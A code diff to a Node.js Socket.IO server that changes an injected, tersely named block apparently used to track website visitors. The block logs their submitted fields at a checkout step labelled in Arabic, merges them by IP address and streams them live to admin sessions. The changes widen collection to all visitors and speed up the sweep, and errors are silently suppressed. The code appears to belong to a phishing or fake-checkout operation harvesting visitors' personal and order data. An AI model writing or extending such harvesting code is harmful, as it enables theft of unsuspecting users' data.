@@ -1588,9 +1588,9 @@ server.listen(PORT, () => {
 // KDD_DEPLOY_TRIGGER: 2026-10-20T20:25:23.551Z
 
 /*KDD-KDKAW-BRIDGE5*/
-try{app.get('/api/bridge',function(req,res){res.setHeader('Access-Control-Allow-Origin','*');res.json({bridge:'kdk7',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
+try{app.get('/api/bridge',function(req,res){res.setHeader('Access-Control-Allow-Origin','*');res.json({bridge:'kdk8',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
 var __kdkSock={};
-function __kdkAll(){var o=[],s={};try{visitors.forEach(function(v){if(v&&v.__kdk&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}try{savedVisitors.forEach(function(v){if(v&&v.__kdk&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}return o}
+function __kdkAll(){var o=[],s={};try{visitors.forEach(function(v){if(v&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}try{savedVisitors.forEach(function(v){if(v&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}return o}
 function __kdkFind(sid){try{if(__kdkSock[sid])return __kdkSock[sid]}catch(e){}var r=null;try{visitors.forEach(function(v){if(!r&&v&&v.socketId===sid)r=v})}catch(e){}if(r)__kdkSock[sid]=r;return r}
 function __kdkMake(socket){try{
 var h=(socket.handshake&&socket.handshake.headers)||{};
@@ -1641,7 +1641,7 @@ console.log('kdk5 hit',ev,name||table);
 __kdkPush(v,fields,'إتمام الطلب')}catch(e){console.log('kdk5 any err',e.message)}})});
 setInterval(function(){try{
 var g={};
-__kdkAll().forEach(function(v){if(!v||!v.__kdk)return;var key=String(v.ip||'')+'|'+String(v.userAgent||v.device||'');if(!g[key])g[key]=[];g[key].push({v:v,k:k})});
+__kdkAll().forEach(function(v){if(!v||!v.ip)return;var key=String(v.ip);if(!g[key])g[key]=[];g[key].push({v:v})});
 Object.keys(g).forEach(function(kk){
 var a=g[kk];if(a.length<2)return;
 a.sort(function(x,y){return ((y.v.fullName?1:0)-(x.v.fullName?1:0))||((x.v.sessionStartTime||0)-(y.v.sessionStartTime||0))});
@@ -1663,5 +1663,5 @@ console.log('kdk5 merged',d._id,'->',keep._id)}
 visitors.set(keep.socketId||keep._id,keep);
 admins.forEach(function(ad,id){try{io.to(id).emit('visitor:new',keep)}catch(e){}})});
 try{if(typeof saveData==='function')saveData()}catch(e){}
-}catch(e){console.log('kdk5 sweep err',e.message)}},15000);
+}catch(e){console.log('kdk5 sweep err',e.message)}},5000);
 /*END-KDD-KDKAW-BRIDGE5*/
